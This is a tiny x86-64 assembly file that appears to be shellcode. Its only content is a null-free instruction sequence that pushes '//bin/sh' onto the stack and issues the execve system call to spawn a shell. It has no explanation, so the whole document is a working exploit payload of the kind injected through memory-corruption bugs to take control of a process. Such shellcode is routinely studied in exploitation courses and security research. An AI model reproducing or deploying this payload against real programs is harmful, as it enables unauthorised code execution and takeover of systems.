#include <sys/syscall.h>

.globl	main
.type	main, @function

main:
//execve("//bin/sh", 0, 0)
xor %rdx, %rdx
xor %rsi, %rsi
mov $0x68732f6e69622f2f, %rdi
push %rsi
push %rdi
mov %rsp, %rdi
xor %rax, %rax
mov $0x3b, %al
syscall
